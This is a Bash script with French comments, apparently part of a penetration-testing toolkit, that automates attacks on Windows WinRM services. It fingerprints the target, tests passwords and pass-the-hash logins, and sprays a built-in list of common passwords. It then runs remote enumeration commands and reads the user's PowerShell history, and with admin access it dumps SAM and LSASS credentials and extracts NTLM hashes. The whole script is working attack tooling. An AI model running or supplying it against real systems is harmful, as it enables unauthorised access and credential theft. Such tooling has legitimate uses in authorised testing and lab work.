#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — WinRM (5985/5986)     ║
# ║   Usage: ./enum_winrm.sh <TARGET> [USER] [PASS/HASH] [DOMAIN]
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"
DOMAIN="${4:-}"

require_target "$TARGET"
banner "WinRM / WMI (5985/5986/135)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "winrm")

NXC=$(command -v nxc || command -v crackmapexec)

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — ports WinRM" "$OUTDIR/nmap_winrm.txt" \
    nmap -sV -sC "$TARGET" -p5985,5986,135 --disable-arp-ping -n \
    -oN "$OUTDIR/nmap_winrm_raw.txt"

# Détecter ports ouverts
PORT_5985=$(grep "5985/tcp.*open" "$OUTDIR/nmap_winrm.txt" 2>/dev/null)
PORT_5986=$(grep "5986/tcp.*open" "$OUTDIR/nmap_winrm.txt" 2>/dev/null)

[[ -n "$PORT_5985" ]] && { finding "WinRM HTTP (5985) ouvert"; PORT="5985"; }
[[ -n "$PORT_5986" ]] && { finding "WinRM HTTPS (5986) ouvert"; PORT="${PORT:-5986}"; }
[[ -z "$PORT_5985" && -z "$PORT_5986" ]] && {
    error "Aucun port WinRM ouvert détecté"
    summary "$OUTDIR"
    exit 0
}

if [[ -n "$NXC" ]]; then
    info "nxc — fingerprint WinRM"
    $NXC winrm "$TARGET" 2>&1 | tee "$OUTDIR/nxc_info.txt"

    OS=$(grep -oP 'Windows\s+\S+(\s+\S+)?' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
    HOSTNAME=$(grep -oP '\(name:\K[^)]+' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
    [[ -n "$OS" ]] && finding "OS : $OS"
    [[ -n "$HOSTNAME" ]] && finding "Hostname : $HOSTNAME"
fi

# ─── 2. VALIDATION CREDENTIALS ──────────────────────────────
section "2. VALIDATION CREDENTIALS"

if [[ -n "$USER" && -n "$NXC" ]]; then
    # Détecter si c'est un hash NTLM
    IS_HASH=false
    if [[ "$PASS" =~ ^[a-fA-F0-9]{32}$ ]]; then
        IS_HASH=true
        info "Hash NTLM détecté — Pass-the-Hash"
    fi

    if $IS_HASH; then
        info "Test PTH : $USER:$PASS"
        $NXC winrm "$TARGET" -u "$USER" -H "$PASS" 2>&1 | tee "$OUTDIR/auth_pth.txt"
        if grep -q "Pwn3d!\|\[+\]" "$OUTDIR/auth_pth.txt"; then
            success "PTH RÉUSSI !"
            echo "$USER:$PASS  # HASH" > "$OUTDIR/valid_creds.txt"
        fi
    else
        info "Test credentials : $USER:$PASS"
        $NXC winrm "$TARGET" -u "$USER" -p "$PASS" 2>&1 | tee "$OUTDIR/auth_check.txt"
        if grep -q "Pwn3d!\|\[+\]" "$OUTDIR/auth_check.txt"; then
            success "ACCÈS WINRM OBTENU !"
            if grep -q "Pwn3d!" "$OUTDIR/auth_check.txt"; then
                finding "ADMIN LOCAL (Pwn3d!)"
            fi
            echo "$USER:$PASS" > "$OUTDIR/valid_creds.txt"
        else
            error "Credentials invalides"
        fi
    fi
fi

# ─── 3. PASSWORD SPRAY ──────────────────────────────────────
section "3. PASSWORD SPRAY"

if [[ -n "$NXC" ]]; then
    if [[ -z "$USER" ]]; then
        warn "Pas d'utilisateur fourni — spray skippé"
        info "Usage: $0 $TARGET <USER> <PASS> [DOMAIN]"
    else
        # Spray avec passwords courants
        PASS_LIST="/tmp/winrm_spray.txt"
        cat > "$PASS_LIST" << 'EOF'
Password123
Password123!
Welcome1
Welcome1!
Summer2024
Winter2024
Spring2024
Admin123
Admin123!
Passw0rd
P@ssw0rd
P@ssword1
EOF
        # Ajouter le username comme password
        echo "$USER" >> "$PASS_LIST"
        echo "${USER}123" >> "$PASS_LIST"
        echo "${USER}@123" >> "$PASS_LIST"

        info "Password spray (${USER} + passwords courants)"
        $NXC winrm "$TARGET" -u "$USER" -p "$PASS_LIST" \
            --continue-on-success 2>&1 | tee "$OUTDIR/spray.txt"
        grep "\[+\]\|Pwn3d" "$OUTDIR/spray.txt" 2>/dev/null | tee -a "$OUTDIR/valid_creds.txt"
    fi
fi

# ─── 4. ENUM POST-CONNEXION ─────────────────────────────────
if [[ -s "$OUTDIR/valid_creds.txt" ]] && check_tool evil-winrm; then
    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    V_USER="${VALID_LINE%%:*}"
    V_PASS="${VALID_LINE##*:}"

    section "4. ENUM POST-CONNEXION (via nxc)"

    DOMAIN_FLAG=""
    [[ -n "$DOMAIN" ]] && DOMAIN_FLAG="-d $DOMAIN"

    if [[ "$V_PASS" =~ ^[a-fA-F0-9]{32}$ ]]; then
        AUTH="-u $V_USER -H $V_PASS $DOMAIN_FLAG"
    else
        AUTH="-u $V_USER -p $V_PASS $DOMAIN_FLAG"
    fi

    # Commandes d'enum via nxc
    info "Récupération infos système"
    $NXC winrm "$TARGET" $AUTH -x "systeminfo" 2>&1 | tee "$OUTDIR/systeminfo.txt"

    info "Utilisateurs locaux"
    $NXC winrm "$TARGET" $AUTH -x "net user" 2>&1 | tee "$OUTDIR/local_users.txt"

    info "Admins locaux"
    $NXC winrm "$TARGET" $AUTH -x "net localgroup administrators" 2>&1 | tee "$OUTDIR/admins.txt"

    info "Processus en cours"
    $NXC winrm "$TARGET" $AUTH -x "tasklist /v" 2>&1 | tee "$OUTDIR/processes.txt"

    info "Variables d'environnement"
    $NXC winrm "$TARGET" $AUTH -x "set" 2>&1 | tee "$OUTDIR/env_vars.txt"

    info "Whoami /all"
    $NXC winrm "$TARGET" $AUTH -x "whoami /all" 2>&1 | tee "$OUTDIR/whoami_all.txt"

    # SeImpersonatePrivilege check
    if grep -qi "SeImpersonatePrivilege.*Enabled" "$OUTDIR/whoami_all.txt" 2>/dev/null; then
        finding "SeImpersonatePrivilege ACTIF → Potato attack possible !"
        echo "SEIMPERSONATE" >> "$OUTDIR/findings.txt"
    fi

    # Historique PowerShell
    info "Historique PowerShell"
    $NXC winrm "$TARGET" $AUTH \
        -x 'type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"' \
        2>&1 | tee "$OUTDIR/ps_history.txt"
    if ! grep -qi "cannot find\|error\|The system" "$OUTDIR/ps_history.txt" 2>/dev/null; then
        finding "Historique PowerShell récupéré !"
    fi

    # ─── 5. DUMP SI ADMIN ───────────────────────────────────
    if grep -q "Pwn3d!" "$OUTDIR/auth_check.txt" 2>/dev/null || \
       grep -q "Pwn3d!" "$OUTDIR/auth_pth.txt" 2>/dev/null; then
        section "5. DUMP CREDENTIALS (admin local)"

        info "Dump SAM"
        $NXC smb "$TARGET" $AUTH --sam 2>&1 | tee "$OUTDIR/dump_sam.txt"

        info "Dump LSASS via lsassy"
        $NXC smb "$TARGET" $AUTH -M lsassy 2>&1 | tee "$OUTDIR/dump_lsassy.txt"

        # Extraire hashes
        grep -oP '\w+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' \
            "$OUTDIR/dump_sam.txt" "$OUTDIR/dump_lsassy.txt" 2>/dev/null | \
            sort -u | tee "$OUTDIR/hashes_found.txt"

        HASH_COUNT=$(wc -l < "$OUTDIR/hashes_found.txt" 2>/dev/null || echo 0)
        [[ "$HASH_COUNT" -gt 0 ]] && success "$HASH_COUNT hashes NTLM récupérés !"
    fi
else
    [[ ! -s "$OUTDIR/valid_creds.txt" ]] && warn "Aucun credential valide — enum post-connexion skippée"
    ! check_tool evil-winrm && warn "evil-winrm non disponible — installer avec: gem install evil-winrm"
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$OS" ]] && info "OS : $OS"
[[ -n "$HOSTNAME" ]] && info "Hostname : $HOSTNAME"

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials / Hash valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}

[[ -s "$OUTDIR/hashes_found.txt" ]] && {
    echo ""
    success "Hashes NTLM :"
    cat "$OUTDIR/hashes_found.txt"
}
